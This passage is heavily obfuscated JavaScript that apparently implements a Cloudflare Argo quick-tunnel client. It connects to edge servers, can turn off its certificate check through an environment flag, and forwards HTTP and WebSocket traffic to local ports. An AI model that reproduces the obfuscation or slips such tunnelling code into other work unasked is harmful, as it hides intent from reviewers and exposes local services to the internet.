                'xfWzE': '{\x22src\x22:\x22origin\x22,\x22flow_rate_limited\x22:false}',
                'UCaSS': function (b, c) {
                    return b + c;
                },
                'tuyzy': e6(0xc2),
                'Zgapc': e6(0xf6),
                'zRBqw': e6(0x52b)
            };
        try {
            this[e6(0x6f5)] = await a0aA(this[e6(0x499)]), this[e6(0x579)]();
            const b = await a[e6(0x348)](a0aD, this['sock']), c = [], d = [];
            for (const [i, j] of b['headers']) {
                const k = i[e6(0x4ee)]();
                a[e6(0x33c)](k, e6(0x557)) && d['push']([
                    k,
                    j
                ]);
                const l = k[e6(0x315)](a[e6(0x712)]) || k[e6(0x315)](a['GWlOc']) || k[e6(0x315)]('cf-proxy-') || k[e6(0x315)](':');
                (!l || k === e6(0x3d6) || k === a[e6(0x15a)] || a[e6(0x54f)](k, a[e6(0x13f)])) && c[e6(0x560)]([
                    k,
                    j
                ]);
            }
            const f = a[e6(0x345)](a0av, c), g = b['status'] === 0x65 ? 0xc8 : b['status'], h = [
                    [
                        ':status',
                        a[e6(0x2ce)](String, g)
                    ],
                    ...d,
                    [
                        'cf-cloudflared-response-headers',
                        f
                    ],
                    [
                        a['wSbuT'],
                        a[e6(0x117)]
                    ]
                ];
            this[e6(0x3d6)][e6(0x286)](this[e6(0x39f)], h), this['writeToOrigin']()[e6(0x521)](() => {
            }), await this[e6(0x587)](b[e6(0x258)]);
        } catch (m) {
            this[e6(0x569)][e6(0x186)](a['UCaSS'](a[e6(0x324)](a['tuyzy'], this[e6(0x39f)]), e6(0x3bd)) + m);
            try {
                this['connection'][e6(0x286)](this[e6(0x39f)], [[
                        a[e6(0x6e7)],
                        a[e6(0x170)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[e6(0x48e)]();
        }
    }
    async [a0aY(0x587)](a) {
        const e7 = a0aY;
        a[e7(0x7bc)] && await this[e7(0x3d6)][e7(0xd5)](this[e7(0x39f)], a, ![]);
        for await (const b of this[e7(0x6f5)]) {
            if (this['stopped'])
                break;
            await this[e7(0x3d6)]['sendData'](this['streamId'], b, ![]);
        }
        !this['stopped'] && await this[e7(0x3d6)]['sendData'](this[e7(0x39f)], Buffer[e7(0x4b7)](0x0), !![]);
    }
    async ['writeToOrigin']() {
        const e8 = a0aY, a = {
                'ntmbY': function (b, c) {
                    return b === c;
                }
            };
        while (!this[e8(0x549)]) {
            const b = await this['_next']();
            if (a[e8(0x430)](b, null))
                return;
            try {
                this['sock'][e8(0x81f)](b);
            } catch (c) {
                this[e8(0x549)] = !![];
                return;
            }
        }
    }
    [a0aY(0x579)]() {
        const e9 = a0aY, a = {
                'SjHhL': function (i, j) {
                    return i + j;
                },
                'nCNrn': function (i, j) {
                    return i + j;
                },
                'vYTRX': e9(0x38d),
                'jgMEJ': e9(0xaf),
                'sMGxf': function (i, j) {
                    return i === j;
                },
                'LOKVi': e9(0x3d6),
                'gkKSO': function (i, j) {
                    return i === j;
                },
                'rjNda': e9(0x46a),
                'JsaLr': function (i, j) {
                    return i === j;
                },
                'CeqtO': e9(0x557),
                'jlDOS': e9(0x645),
                'dNYiG': 'sec-websocket-key',
                'tNXrB': function (i, j) {
                    return i === j;
                },
                'SOtyR': e9(0x499),
                'HtbrA': function (i, j) {
                    return i + j;
                },
                'BwbQC': function (i, j) {
                    return i + j;
                },
                'XTRfd': e9(0x5ed),
                'yyzEY': e9(0x5ab),
                'sTURp': 'Sec-WebSocket-Key:\x20',
                'EHOGD': e9(0x2df),
                'mYSMH': e9(0x575),
                'POYta': e9(0x2d8),
                'GGmPy': e9(0x39a),
                'fEaZJ': 'latin1'
            }, b = new URL(this[e9(0x499)]), c = this[e9(0x133)][e9(0x7d7)][e9(0x315)]('/') ? this[e9(0x133)][e9(0x7d7)] : a[e9(0x436)]('/', this['request']['path']), d = [a['nCNrn'](a['SjHhL'](a[e9(0x22e)], c), a[e9(0x140)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[e9(0x133)][e9(0xce)]) {
            const k = i[e9(0x4ee)]();
            if (a[e9(0x43a)](k, e9(0x57f)) || a[e9(0x43a)](k, a[e9(0x708)]) || a[e9(0x4d8)](k, a[e9(0x4b3)]) || a[e9(0x3af)](k, a['CeqtO']) || a[e9(0x3af)](k, a[e9(0x332)]))
                continue;
            if (k === a['dNYiG'])
                f = !![];
            else {
                if (a['tNXrB'](k, e9(0x2e5)))
                    g = !![];
                else
                    k === a['SOtyR'] && (h = !![]);
            }
            d['push'](a[e9(0x1f8)](a[e9(0x64a)](i, ':\x20'), j));
        }
        d[e9(0x560)](a[e9(0x1f8)](a[e9(0x6b1)], b[e9(0x57f)])), !h && this[e9(0x133)][e9(0x473)] && d[e9(0x560)](a[e9(0x76e)] + this[e9(0x133)][e9(0x473)]), !f && d[e9(0x560)](a['sTURp'] + a0k['randomBytes'](0x10)['toString'](a[e9(0x6ef)])), !g && d['push'](e9(0x68a)), d[e9(0x560)](a[e9(0x799)]), d[e9(0x560)](a[e9(0x4c2)]), this[e9(0x6f5)]['write'](Buffer[e9(0x664)](a[e9(0x1f8)](d[e9(0x16d)]('\x0d\x0a'), a[e9(0x20c)]), a[e9(0x1a9)]));
    }
}
class a0az {
    constructor(a, b, c) {
        const ea = a0aY, d = ea(0x9c)[ea(0x493)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this['streamId'] = b;
                continue;
            case '1':
                this[ea(0x1b7)] = ![];
                continue;
            case '2':
                this[ea(0x569)] = c;
                continue;
            case '3':
                this['connection'] = a;
                continue;
            case '4':
                this[ea(0x644)] = Buffer['alloc'](0x0);
                continue;
            }
            break;
        }
    }
    [a0aY(0x715)](a, b, c, d) {
        const eb = a0aY, f = {
                'lWNqi': function (g, h) {
                    return g(h);
                },
                'UfmRp': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[eb(0x3d6)][eb(0xd5)](this[eb(0x39f)], f[eb(0x55b)](a0ak, 0x0), ![]), this[eb(0x3d6)][eb(0xd5)](this[eb(0x39f)], f[eb(0x2f2)](a0al, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aY(0x5d6)](a) {
        const ec = a0aY, b = {
                'qnOwK': function (f, g) {
                    return f(g);
                },
                'FKhBp': ec(0x50a),
                'hMEex': ec(0x600),
                'TyRfR': function (f, g) {
                    return f + g;
                },
                'svlvk': ec(0x3a3),
                'hyByV': ec(0x7d2)
            };
        this[ec(0x644)] = this['buffer'][ec(0x7bc)] ? Buffer[ec(0x12a)]([
            this[ec(0x644)],
            a
        ]) : a;
        let c, d;
        [c, d] = a0am(this[ec(0x644)]), this['buffer'] = d;
        for (const f of c) {
            try {
                const g = b['qnOwK'](a0ap, f);
                g['ok'] ? (this[ec(0x569)][ec(0x554)](b[ec(0x168)] + (g['location'] || b[ec(0xe5)])), this[ec(0x3d6)]['registered'] = !![]) : (this[ec(0x569)]['warning'](b[ec(0x6a1)](b[ec(0x224)], g[ec(0x1c6)] || b[ec(0x51e)])), this[ec(0x3d6)][ec(0xf5)] = !![], this[ec(0x3d6)][ec(0x549)] = !![]);
            } catch (h) {
                this[ec(0x569)]['debug'](b['TyRfR'](ec(0x494), h));
            }
        }
    }
}
function a0aA(a) {
    const ed = a0aY, b = {
            'KVGFi': function (c, d, f) {
                return c(d, f);
            },
            'EeMZf': 'error',
            'awfrY': ed(0x230),
            'xFzqb': function (c, d) {
                return c(d);
            },
            'lZpmf': ed(0x615),
            'LIwio': ed(0x4f6),
            'eWAzm': function (c, d) {
                return c === d;
            },
            'KyQlh': 'connect'
        };
    return new Promise((c, d) => {
        const ee = ed, f = {
                'dhpsW': ee(0x138),
                'tsBxt': b[ee(0x60e)],
                'CbMqw': function (n, o, p) {
                    return b['KVGFi'](n, o, p);
                },
                'gqkCV': function (n, o, p) {
                    return n(o, p);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[ee(0x3c4)](d, new Error(ee(0x1d5)));
            return;
        }
        if (![
                b[ee(0x452)],
                b[ee(0x142)]
            ]['includes'](g['protocol']) || !g[ee(0x5e8)]) {
            b['xFzqb'](d, new Error(ee(0x1d5)));
            return;
        }
        const h = b[ee(0x476)](g[ee(0x1c5)], b['LIwio']), i = g['port'] || (h ? 0x1bb : 0x50), j = a0i['connect']({
                'host': g['hostname'],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const ef = ee, q = f['dhpsW'][ef(0x493)]('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        k = !![];
                        continue;
                    case '1':
                        j['setTimeout'](0x0);
                        continue;
                    case '2':
                        j[ef(0x70c)](f['tsBxt'], m);
                        continue;
                    case '3':
                        o(p);
                        continue;
                    case '4':
                        if (k)
                            return;
                        continue;
                    }
                    break;
                }
            }, m = o => {
                !k && l(d, o);
            };
        j['on'](b[ee(0x60e)], m), j[ee(0x352)](0x7530, () => j[ee(0x541)](new Error('origin\x20connection\x20timeout'))), j['on'](b['KyQlh'], () => {
            const eg = ee;
            if (!h) {
                b[eg(0x50c)](l, c, j);
                return;
            }
            const o = a0j['connect']({
                'socket': j,
                'servername': g[eg(0x5e8)]
            });
            o['on'](b[eg(0x60e)], p => {
                const eh = eg;
                !k && f[eh(0x40b)](l, d, p);
            }), o['on'](b['awfrY'], () => {
                const ei = eg;
                f[ei(0x107)](l, c, o);
            });
        });
    });
}
function a0aB(a) {
    const ej = a0aY, b = {
            'AFkhe': function (d, f) {
                return d < f;
            }
        }, c = [];
    for (let d = 0x0; b[ej(0x166)](d, a['rawHeaders'][ej(0x7bc)]); d += 0x2) {
        c[ej(0x560)]([
            a[ej(0x54b)][d],
            a['rawHeaders'][d + 0x1]
        ]);
    }
    return c;
}
function a0aC(a, b, c, d, f) {
    const ek = a0aY, g = {
            'IeMkd': function (h, i) {
                return h(i);
            },
            'NdZJG': function (h, i) {
                return h(i);
            },
            'CpYiq': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'nnDpo': ek(0x4f6),
            'IINCy': function (h, i) {
                return h === i;
            },
            'oozBs': function (h, i) {
                return h === i;
            },
            'Tmrtj': ek(0x57f),
            'XXEBe': function (h, i) {
                return h === i;
            },
            'OzLCw': ek(0x3d6),
            'FoIlf': ek(0x645),
            'tsckS': function (h, i) {
                return h === i;
            },
            'NyVKy': ek(0x557),
            'HxsFM': 'Host',
            'Wbnqi': 'Content-Length',
            'YXUAi': ek(0x1c6)
        };
    return new Promise((h, i) => {
        const el = ek, j = {
                'XrweW': function (r, s) {
                    return g['IeMkd'](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            g[el(0xc1)](i, new Error(g[el(0x7e1)]));
            return;
        }
        if (![
                el(0x615),
                g[el(0x536)]
            ][el(0x7a2)](k[el(0x1c5)]) || !k[el(0x5e8)]) {
            i(new Error(g[el(0x7e1)]));
            return;
        }
        const l = g[el(0x2eb)](k[el(0x1c5)], g[el(0x536)]), m = k['port'] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s[el(0x4ee)]();
            if (g[el(0x190)](u, g[el(0x82b)]) || g[el(0x6d1)](u, g[el(0x696)]) || g[el(0x6d1)](u, g[el(0x641)]) || g['tsckS'](u, g[el(0x1ca)]))
                continue;
            n[s] = t;
        }
        n[g[el(0x1f2)]] = k[el(0x57f)];
        f[el(0x7bc)] && (n[g[el(0x2c9)]] = g[el(0xc1)](String, f[el(0x7bc)]));
        const o = c['startsWith']('/') ? c : '/' + c, p = l ? a0h : a0g, q = p[el(0x133)]({
                'hostname': k[el(0x5e8)],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const em = el;
                j['XrweW'](h, {
                    'status': v[em(0x62b)],
                    'headers': j[em(0x828)](a0aB, v),
                    'body': v
                });
            });
        q['on'](g['YXUAi'], v => i(v)), q['end'](f[el(0x7bc)] ? f : undefined);
    });
}
function a0aD(a) {
    const en = a0aY, b = {
            'wksVC': function (c) {
                return c();
            },
            'ClSZx': function (c, d) {
                return c(d);
            },
            'ZoWRf': function (c, d) {
                return c(d);
            },
            'SyNfQ': en(0x54a),
            'btqZe': en(0x1c6),
            'MbNjk': en(0x581),
            'fNysY': function (c, d, f) {
                return c(d, f);
            },
            'VNpSr': en(0x113),
            'xgwaE': function (c, d) {
                return c + d;
            },
            'apThE': en(0x233)
        };
    return new Promise((c, d) => {
        const eo = en, f = {
                'nIEKP': b[eo(0x654)],
                'xcQjK': b['btqZe'],
                'TfJuX': b['MbNjk'],
                'MPxLF': function (l, m) {
                    return l < m;
                },
                'DQndh': function (l) {
                    const ep = eo;
                    return b[ep(0xb4)](l);
                },
                'XBrFP': 'latin1',
                'kEqQe': function (l, m, n) {
                    const eq = eo;
                    return b[eq(0x4ce)](l, m, n);
                },
                'wpCsK': function (l, m) {
                    return b['ClSZx'](l, m);
                },
                'kKTnJ': b[eo(0xdb)],
                'KAcYt': function (l, m) {
                    return b['xgwaE'](l, m);
                },
                'TYqwq': function (l, m) {
                    return b['xgwaE'](l, m);
                }
            };
        let g = Buffer['alloc'](0x0);
        const h = () => {
                const er = eo;
                a[er(0x70c)](f[er(0x175)], i), a[er(0x70c)](f[er(0x31d)], j), a[er(0x70c)](f[er(0x19a)], k), a[er(0x70c)]('close', k);
            }, i = l => {
                const es = eo;
                g = g[es(0x7bc)] ? Buffer[es(0x12a)]([
                    g,
                    l
                ]) : l;
                const m = g[es(0x539)]('\x0d\x0a\x0d\x0a');
                if (f[es(0x7d0)](m, 0x0))
                    return;
                f[es(0x1f5)](h);
                const n = g['subarray'](0x0, m)[es(0xec)](f['XBrFP']), o = n['split']('\x0d\x0a'), p = o[0x0][es(0x493)]('\x20'), q = f['kEqQe'](parseInt, p[0x1], 0xa);
                if (!Number['isInteger'](q)) {
                    f[es(0x829)](d, new Error(f[es(0x4d0)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; s < o['length']; s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[es(0x539)](':');
                    u > 0x0 && r[es(0x560)]([
                        t[es(0x462)](0x0, u)[es(0x450)](),
                        t[es(0x462)](f[es(0x35c)](u, 0x1))[es(0x450)]()
                    ]);
                }
                f[es(0x829)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g['subarray'](f[es(0x6eb)](m, 0x4))
                });
            }, j = l => {
                const et = eo;
                b[et(0xb4)](h), b[et(0x5ac)](d, l);
            }, k = () => {
                const eu = eo;
                b[eu(0xb4)](h), b[eu(0x6ed)](d, new Error(eu(0x678)));
            };
        a['on'](b[eo(0x654)], i), a['on'](b[eo(0x6e2)], j), a['on'](b[eo(0x5d3)], k), a['on'](b[eo(0x183)], k);
    });
}
function a0aE(a) {
    const ev = a0aY, b = {
            'WPiEY': ev(0x527),
            'ZwioR': function (f, g) {
                return f === g;
            },
            'BHpsb': ev(0x5bc),
            'VFjve': function (f, g) {
                return f !== g;
            },
            'FtzCx': ev(0x1d8),
            'TFMfD': ev(0x815),
            'MLQbc': function (f, g) {
                return f(g);
            },
            'NbvZX': ev(0x824),
            'yxWVo': function (f, g) {
                return f + g;
            },
            'Kwyjy': ev(0x212),
            'mpqZU': function (f, g) {
                return f !== g;
            },
            'GzyPZ': 'CloudFlare\x20Origin\x20Certificate',
            'dSNWV': ev(0x7f4),
            'DEMHu': function (f, g) {
                return f(g);
            },
            'zYdjr': 'SAN\x20does\x20not\x20cover\x20h2.cftunnel.com'
        };
    if (!a || !a[ev(0x791)])
        return 'no\x20peer\x20certificate';
    if (b[ev(0x6a5)](a[ev(0x791)]['O'], b[ev(0x191)]))
        return b[ev(0xa4)] + (a[ev(0x791)]['O'] || '');
    if (!b['MLQbc'](String, a[ev(0x791)]['OU'] || '')[ev(0x315)](b[ev(0x4c5)]))
        return b['yxWVo'](b[ev(0x328)], a[ev(0x791)]['OU'] || '');
    if (!a[ev(0x665)] || b['mpqZU'](a[ev(0x665)]['CN'], b[ev(0x73c)]))
        return b[ev(0x4b5)];
    const c = b[ev(0xa9)](String, a[ev(0x31c)] || '')[ev(0x493)](',')[ev(0x415)](f => f[ev(0x450)]()[ev(0x4ee)]()), d = c['some'](f => {
            const ew = ev;
            if (!f['startsWith'](b[ew(0x803)]))
                return ![];
            const g = f[ew(0x462)](0x4);
            return b[ew(0x46d)](g, ew(0x2e3)) || b[ew(0x46d)](g, b[ew(0x7b4)]) || g[ew(0x315)]('*.') && ew(0x2e3)[ew(0x344)](g[ew(0x462)](0x1));
        });
    if (!d)
        return b[ev(0x440)];
    return null;
}
function a0aF(a, b) {
    const ex = a0aY, c = {
            'eNQTG': function (h, i) {
                return h + i;
            },
            'UuRGJ': ex(0x197),
            'GlePI': function (h, i) {
                return h !== i;
            },
            'tCqGD': ex(0xa1),
            'Xannf': function (h, i) {
                return h + i;
            },
            'NOjbH': ex(0x22a),
            'JBsiU': function (h, i) {
                return h(i);
            },
            'jSrQw': function (h, i) {
                return h + i;
            },
            'DqAuc': ex(0x33d),
            'ixPjG': function (h, i) {
                return h + i;
            },
            'hfTdW': ex(0x42c),
            'xhRAS': function (h) {
                return h();
            }
        }, d = a0a2[ex(0x462)]()[ex(0x49a)](() => Math[ex(0x832)]() - 0.5);
    let f = null;
    const g = async () => {
        const ez = ex, h = {
                'aAmOH': function (i, j) {
                    return i(j);
                },
                'XtZjJ': function (i, j) {
                    const ey = a0b;
                    return c[ey(0x7c7)](i, j);
                },
                'TQinB': c[ez(0x466)],
                'ZtDjo': function (i, j) {
                    const eA = ez;
                    return c[eA(0x753)](i, j);
                },
                'ltDPL': c[ez(0x6db)],
                'tqpVD': function (i, j) {
                    return i > j;
                },
                'bYocH': function (i, j) {
                    const eB = ez;
                    return c[eB(0x4dc)](i, j);
                },
                'AreSr': c[ez(0x393)],
                'VDJJD': function (i, j) {
                    return c['JBsiU'](i, j);
                }
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const eC = ez, l = a0j[eC(0x299)]({
                            'host': i,
                            'port': a0a3,
                            'ALPNProtocols': ['h2'],
                            'servername': eC(0x2e3),
                            'rejectUnauthorized': ![]
                        });
                    l[eC(0x352)](0x2710, () => l[eC(0x541)](new Error(eC(0x358)))), l['on']('error', k), l['on'](eC(0x230), () => {
                        const eD = eC;
                        if (a) {
                            const n = h[eD(0x631)](a0aE, l[eD(0x4cf)](![]));
                            if (n) {
                                l[eD(0x541)](new Error(h[eD(0x6e1)](h[eD(0x366)], n)));
                                return;
                            }
                        }
                        const m = l[eD(0x512)];
                        if (m && h[eD(0x14e)](m, 'h2')) {
                            l[eD(0x541)](new Error(h[eD(0x3fc)]));
                            return;
                        }
                        h[eD(0x4e7)](a0aK, 0x0) ? l[eD(0x352)](a0aK, () => l[eD(0x541)](new Error('edge\x20connection\x20idle\x20timeout'))) : l[eD(0x352)](0x0), b[eD(0x554)](h[eD(0x588)](h[eD(0x6e1)](h[eD(0x6e1)](h[eD(0x2ee)], i), ':'), a0a3)), h[eD(0x294)](j, l);
                    });
                });
            } catch (j) {
                f = j, b[ez(0x186)](c[ez(0x4dc)](c[ez(0x1e1)](c[ez(0x180)], i) + ez(0x3bd), j));
            }
        }
        throw new Error(c['ixPjG'](c[ez(0x2c2)], f));
    };
    return c[ex(0x538)](g);
}
const a0aG = 0x2;
function a0aH(a, b, c) {
    const eE = a0aY, d = parseInt(process.env[a] || '', 0xa);
    if (!Number[eE(0x653)](d) || d < c)
        return b;
    return d;
}
const a0aI = a0aH(a0aY(0x211), 0x5, 0x2), a0aJ = 0x1e, a0aK = ((() => {
        const eF = a0aY, a = {
                'ohHrs': function (c, d) {
                    return c < d;
                },
                'EgRZk': function (c, d) {
                    return c * d;
                },
                'PtLgz': function (c, d) {
                    return c === d;
                }
            }, b = parseInt(process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number['isInteger'](b) || a['ohHrs'](b, 0x0))
            return a[eF(0x66d)](0x12c, 0x3e8);
        return a[eF(0x330)](b, 0x0) ? 0x0 : Math[eF(0x217)](b, 0xa) * 0x3e8;
    })());
function a0aL(a) {
    const eG = a0aY, b = {
            'OEevX': function (c, d) {
                return c === d;
            },
            'zfssQ': 'string',
            'facmb': eG(0x1fe)
        };
    if (b['OEevX'](typeof a, b[eG(0x6d2)])) {
        const c = a[eG(0x450)]();
        if (c)
            try {
                return JSON[eG(0x517)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b[eG(0x68c)](typeof a, b[eG(0x633)]) ? a : {};
}
class a0aM {
    constructor(a) {
        const eH = a0aY;
        this[eH(0x569)] = a, this['tunnels'] = new Map(), this[eH(0x70f)] = null;
    }
    async [a0aY(0x552)](a, b) {
        const eI = a0aY, c = {
                'htDJe': function (l, m) {
                    return l > m;
                },
                'tPwme': function (l, m) {
                    return l(m);
                },
                'gAuIO': eI(0x4a0),
                'TPhut': function (l, m) {
                    return l + m;
                },
                'PQoDX': 'failed\x20to\x20create\x20tunnel:\x20',
                'suXMX': eI(0x766),
                'pUwmh': function (l, m) {
                    return l + m;
                },
                'zGksY': function (l, m) {
                    return l + m;
                },
                'SKPmk': 'argo\x20tunnel\x20created:\x20'
            }, d = this['tunnels'][eI(0x7dd)](a) || [];
        if (c[eI(0x475)](d['length'], 0x0) && !b) {
            const l = new Error(eI(0x1fc) + a + eI(0x336));
            l['status'] = 0x199, l[eI(0x7a9)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c['tPwme'](a0au, c[eI(0x322)]);
        } catch (m) {
            const n = new Error(c[eI(0x5f2)](c[eI(0x601)], m[eI(0x5a9)]));
            n['status'] = 0x1f4, n['port'] = a;
            throw n;
        }
        const j = f['startsWith'](c[eI(0x584)]) ? f : c[eI(0x706)](c[eI(0x584)], f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()[eI(0x2e6)]()[eI(0xed)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[eI(0x128)] = this[eI(0x253)](k, g, h, i)[eI(0x521)](o => this[eI(0x569)][eI(0x186)](eI(0x63e) + j + eI(0x56b) + o[eI(0x5a9)])), d[eI(0x560)](k), this[eI(0x21f)][eI(0x39b)](a, d), this['log'][eI(0x554)](c[eI(0x1d7)](c[eI(0x706)](c[eI(0x77b)], j), eI(0x668)) + a), k;
    }
    [a0aY(0x59b)]() {
        const eJ = a0aY, a = [], b = [...this[eJ(0x21f)][eJ(0x80a)]()][eJ(0x49a)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this[eJ(0x21f)][eJ(0x7dd)](c)) {
                a[eJ(0x560)]({
                    'tunnel_domain': d[eJ(0x54c)],
                    'port': d[eJ(0x7a9)],
                    'created_at': d['createdAt']
                });
            }
        }
        return a;
    }
    async [a0aY(0x377)](a, b) {
        const eK = a0aY, c = {
                'ALPmR': function (i, j) {
                    return i === j;
                },
                'GTsxQ': function (i, j) {
                    return i === j;
                },
                'RJHFl': function (i, j) {
                    return i > j;
                },
                'cDykx': function (i, j) {
                    return i + j;
                },
                'oQYGB': eK(0x321)
            }, d = this[eK(0x21f)][eK(0x7dd)](a) || [];
        if (d['length'] === 0x0)
            return {
                'status': 0x194,
                'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a
            };
        let f;
        if (c[eK(0x1ff)](b, undefined) || b === null || c[eK(0x778)](b, '')) {
            if (d[eK(0x7bc)] > 0x1)
                return {
                    'status': 0x199,
                    'message': 'multiple\x20tunnels\x20exist\x20on\x20port\x20' + a + eK(0x45b)
                };
            f = d;
        } else {
            f = d[eK(0xfb)](i => i[eK(0x54c)] === b);
            if (c[eK(0x1ff)](f[eK(0x7bc)], 0x0))
                return {
                    'status': 0x194,
                    'message': eK(0x619) + a + eK(0x83b) + b
                };
        }
        const g = [];
        for (const i of f) {
            i[eK(0x549)] = !![];
            if (i[eK(0x6f5)] !== null)
                try {
                    i[eK(0x6f5)][eK(0x541)]();
                } catch (j) {
                }
            await i[eK(0x128)][eK(0x521)](() => {
            }), g[eK(0x560)]({
                'tunnel_domain': i[eK(0x54c)],
                'port': i['port'],
                'created_at': i['createdAt']
            });
        }
        const h = d[eK(0xfb)](k => !k[eK(0x549)]);
        c[eK(0x7c3)](h[eK(0x7bc)], 0x0) ? this['tunnels'][eK(0x39b)](a, h) : this[eK(0x21f)][eK(0xfd)](a);
        for (const k of g) {
            this[eK(0x569)][eK(0x554)](c[eK(0x6a0)](c[eK(0x535)], k[eK(0x7cd)]));
        }
        return {
            'status': 'ok',
            'deleted': g[eK(0x7bc)],
            'tunnels': g
        };
    }
    async [a0aY(0x253)](a, b, c, d) {
        const eL = a0aY, f = {
                'UoLaq': function (k, l) {
                    return k < l;
                },
                'MPhJv': function (k, l) {
                    return k + l;
                },
                'BuqEM': eL(0x37f),
                'ORGgY': function (k, l) {
                    return k(l);
                },
                'zSYdI': 'true',
                'ATvEi': function (k, l, m) {
                    return k(l, m);
                },
                'MgioI': function (k, l) {
                    return k % l;
                },
                'ehRLa': function (k, l) {
                    return k + l;
                },
                'VOQgl': eL(0x2d7),
                'doOOV': function (k, l) {
                    return k !== l;
                },
                'syZag': function (k, l) {
                    return k >= l;
                },
                'lAikF': function (k, l) {
                    return k(l);
                },
                'rhGiy': function (k, l) {
                    return k * l;
                }
            }, g = f[eL(0x4fe)](f['BuqEM'], a['port']), h = async k => {
                const eM = eL;
                for (let l = 0x0; f[eM(0x26d)](l, k) && !a[eM(0x549)]; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math[eM(0x6ab)](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a[eL(0x549)]) {
            let k = null, l = null;
            try {
                const m = f[eL(0x819)](String, process.env.KISAMA_EDGE_INSECURE || '')[eL(0x4ee)]() !== f['zSYdI'];
                k = await f['ATvEi'](a0aF, m, this[eL(0x569)]);
                if (a[eL(0x549)]) {
                    try {
                        k[eL(0x541)]();
                    } catch (n) {
                    }
                    break;
                }
                a['sock'] = k, j = f[eL(0x4b2)](f[eL(0x492)](j, 0x1), 0x4), l = new a0ax(k, g, b, c, d, j, this[eL(0x569)], a[eL(0x54c)], ![], { 'printed': !![] }), await l['run']();
            } catch (o) {
                !a[eL(0x549)] && this[eL(0x569)][eL(0x186)](f['ehRLa'](f[eL(0x4fe)](eL(0x79c), a['tunnelDomain']), f[eL(0x2f4)]) + o[eL(0x5a9)]);
            } finally {
                if (k !== null)
                    try {
                        k[eL(0x541)]();
                    } catch (p) {
                    }
                a['sock'] = null;
            }
            if (a[eL(0x549)])
                break;
            f[eL(0x15e)](l, null) && l[eL(0x809)] ? i = 0x0 : (i += 0x1, f[eL(0x806)](i, a0aI) && (await this[eL(0x637)](a, (q, r, s) => {
                b = q, c = r, d = s;
            }) ? i = 0x0 : await h(a0aJ * 0x3e8))), !a['stopped'] && await f[eL(0x6d5)](h, f[eL(0x54d)](a0aG, 0x3e8));
        }
    }
    [a0aY(0x637)](a, b) {
        const eN = a0aY, c = {
                'nYdnb': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'aAgWf': function (f, g) {
                    return f + g;
                },
                'AmWMK': function (f, g) {
                    return f + g;
                },
                'LCCad': eN(0x177),
                'xUuts': function (f, g) {
                    return f === g;
                },
                'OGjIR': eN(0xca),
                'eTmNe': function (f, g) {
                    return f + g;
                },
                'DfWty': eN(0x741),
                'CmRnc': function (f, g) {
                    return f(g);
                },
                'fqSHM': eN(0x4a0)
            }, d = this[eN(0x4d4)] || a0au;
        return c['CmRnc'](d, c[eN(0x635)])[eN(0x607)](([f, g, h, i]) => {
            const eO = eN, j = a['tunnelDomain'];
            c[eO(0x713)](b, g, h, i), a[eO(0x54c)] = f['startsWith'](eO(0x766)) ? f : c['aAgWf'](eO(0x766), f), this['log']['warning'](c[eO(0x4e6)](eO(0x178), j) + c[eO(0x2d3)] + a[eO(0x54c)]);
            if (c[eO(0x229)](typeof this['onDomainChange'], c[eO(0x70b)]))
                try {
                    this[eO(0x70f)](j, a[eO(0x54c)]);
                } catch (k) {
                }
            return !![];
        })[eN(0x521)](f => {
            const eP = eN;
            return this[eP(0x569)][eP(0x186)](c[eP(0x4f0)](c[eP(0x1b9)], f['message'])), ![];
        });
    }
}
class a0aN {
    static ['_baseinfoHooked'] = ![];
    static [a0aY(0x2d9)] = null;
    static [a0aY(0x60d)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static ['_SHZAL_KEY_HINT_SHOWN'] = ![];
    static [a0aY(0x443)]() {
        const eQ = a0aY, a = {
                'QeDfL': function (g, h) {
                    return g < h;
                },
                'vNaSL': eQ(0x442),
                'WIXSe': 'KNAME',
                'KNBMR': eQ(0x480),
                'ehEMC': eQ(0x55c)
            }, b = a0P['KNAME'] || '', c = a0P['KNAME_KEY'] || a0P['KNAME'] || '', d = [];
        if (a[eQ(0x109)](b[eQ(0x7bc)], 0x3))
            d[eQ(0x560)](eQ(0x626) + b[eQ(0x7bc)] + '<3)');
        if (!this[eQ(0x60d)]['test'](b))
            d[eQ(0x560)](a[eQ(0x7e0)]);
        if (a[eQ(0x109)](c[eQ(0x7bc)], 0x8))
            d[eQ(0x560)](eQ(0x551) + c[eQ(0x7bc)] + eQ(0x542) + (a0P[eQ(0x636)] ? eQ(0x636) : a[eQ(0x21c)]) + ')');
        const f = d[eQ(0x7bc)] === 0x0;
